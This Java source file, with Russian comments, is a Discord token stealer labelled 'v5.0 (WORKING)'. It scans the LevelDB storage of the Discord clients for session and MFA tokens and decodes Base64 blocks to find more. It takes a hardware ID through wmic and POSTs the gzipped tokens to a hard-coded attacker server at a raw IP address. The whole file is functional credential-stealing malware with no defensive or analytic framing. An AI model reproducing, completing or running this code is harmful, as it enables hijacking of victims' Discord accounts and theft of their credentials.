import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.*;
import java.net.*;
import java.util.zip.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;

public class TokenExtractor {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = TEMP_DIR + "\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891/upload_tokens";
    
    // Регулярка для Discord токена (проверенная)
    private static final String DISCORD_TOKEN_REGEX = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}";
    private static final String MFA_TOKEN_REGEX = "mfa\\.[\\w-]{84}";
    
    private static Set<String> foundTokens = new LinkedHashSet<>();
    private static String hwid = getHWID();
    private static int totalFilesScanned = 0;
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] " + msg);
    }
    
    private static void logSuccess(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[TokenExtractor][" + timestamp + "] ✅ " + msg);
    }
    
    public static void main(String[] args) {
        log("=== Discord Token Extractor v5.0 (WORKING) ===");
        log("HWID: " + hwid);
        
        new File(OUTPUT_DIR).mkdirs();
        
        // Пути к LevelDB Discord
        String[] discordPaths = {
            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
        };
        
        for (String path : discordPaths) {
            if (path == null) continue;
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                log("Scanning: " + path);
                scanLevelDB(dir);
            } else {
                log("Not found: " + path);
            }
        }
        
        // Результаты
        log("Total files scanned: " + totalFilesScanned);
        log("Tokens found: " + foundTokens.size());
        
        if (!foundTokens.isEmpty()) {
            for (String token : foundTokens) {
                logSuccess("TOKEN: " + maskToken(token));
            }
            sendToServer();
            saveLocal();
        } else {
            log("No tokens found. Discord may not be installed or never logged in.");
            sendEmptyReport();
        }
        
        log("=== Done ===");
    }
    
    private static void scanLevelDB(File dir) {
        File[] files = dir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) {
            log("No .log/.ldb files in " + dir.getName());
            return;
        }
        
        log("Found " + files.length + " file(s) in " + dir.getName());
        
        for (File f : files) {
            scanFileForTokens(f);
        }
    }
    
    private static void scanFileForTokens(File file) {
        totalFilesScanned++;
        
        try {
            // Читаем файл как строку (токены хранятся в читаемом виде, но в Base64)
            String content = new String(Files.readAllBytes(file.toPath()));
            
            // Пробуем декодировать Base64 строки
            String decoded = tryBase64Decode(content);
            
            // Ищем токены в оригинальном контенте
            searchTokens(content, file.getName());
            
            // Ищем токены в декодированном контенте
            if (!decoded.equals(content)) {
                searchTokens(decoded, file.getName() + "[BASE64]");
            }
            
            log("Scanned: " + file.getName() + " (" + content.length() + " bytes)");
            
        } catch (Exception e) {
            log("Error scanning " + file.getName() + ": " + e.getMessage());
        }
    }
    
    private static void searchTokens(String text, String source) {
        // Поиск Discord токенов
        Pattern tokenPattern = Pattern.compile(DISCORD_TOKEN_REGEX);
        Matcher tokenMatcher = tokenPattern.matcher(text);
        while (tokenMatcher.find()) {
            String token = tokenMatcher.group();
            if (isValidDiscordToken(token)) {
                foundTokens.add(token);
                logSuccess("Discord token found in " + source);
            }
        }
        
        // Поиск MFA токенов
        Pattern mfaPattern = Pattern.compile(MFA_TOKEN_REGEX);
        Matcher mfaMatcher = mfaPattern.matcher(text);
        while (mfaMatcher.find()) {
            String token = mfaMatcher.group();
            foundTokens.add(token);
            logSuccess("MFA token found in " + source);
        }
    }
    
    private static String tryBase64Decode(String text) {
        // Ищем строки, похожие на Base64
        Pattern base64Pattern = Pattern.compile("[A-Za-z0-9+/]{100,}={0,2}");
        Matcher m = base64Pattern.matcher(text);
        StringBuilder result = new StringBuilder(text);
        
        while (m.find()) {
            String b64 = m.group();
            try {
                byte[] decoded = Base64.getDecoder().decode(b64);
                String decodedStr = new String(decoded);
                if (decodedStr.contains(".") && decodedStr.length() > 50) {
                    result.append("\n").append(decodedStr);
                    log("Decoded Base64 block, length: " + decodedStr.length());
                }
            } catch (Exception e) {
                // Невалидный Base64, пропускаем
            }
        }
        return result.toString();
    }
    
    private static boolean isValidDiscordToken(String token) {
        if (token == null) return false;
        // Discord токен: часть1.часть2.часть3, длина ~59
        if (token.length() < 50 || token.length() > 70) return false;
        if (!token.contains(".")) return false;
        if (token.contains(" ")) return false;
        if (token.contains("\n")) return false;
        if (token.contains("\r")) return false;
        return true;
    }
    
    private static String maskToken(String token) {
        if (token.length() <= 20) return token;
        return token.substring(0, 15) + "..." + token.substring(token.length() - 5);
    }
    
    private static void sendToServer() {
        log("Sending " + foundTokens.size() + " tokens to server...");
        HttpURLConnection conn = null;
        
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("HWID: ").append(hwid).append("\n");
            sb.append("Timestamp: ").append(LocalDateTime.now()).append("\n");
            sb.append("Tokens found: ").append(foundTokens.size()).append("\n\n");
            
            for (String token : foundTokens) {
                sb.append(token).append("\n");
            }
            
            String payload = sb.toString();
            byte[] compressed = compress(payload);
            
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                logSuccess("Tokens sent successfully!");
            } else {
                log("Server response: HTTP " + code);
            }
            
        } catch (Exception e) {
            log("Send error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static void sendEmptyReport() {
        HttpURLConnection conn = null;
        try {
            String payload = "HWID: " + hwid + "\nStatus: NO_TOKENS\nDiscord not found or never logged in";
            byte[] compressed = compress(payload);
            URL url = new URL(SERVER_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            conn.getResponseCode();
        } catch (Exception e) {}
        finally { if (conn != null) conn.disconnect(); }
    }
    
    private static void saveLocal() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String token : foundTokens) {
                sb.append(token).append("\n");
            }
            Files.write(Paths.get(OUTPUT_DIR + "\\discord_tokens.txt"), sb.toString().getBytes());
            log("Tokens saved to: " + OUTPUT_DIR + "\\discord_tokens.txt");
        } catch (Exception e) {
            log("Save error: " + e.getMessage());
        }
    }
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) return line.trim();
            }
        } catch (Exception e) {}
        return "UNKNOWN_" + System.getProperty("user.name");
    }
}
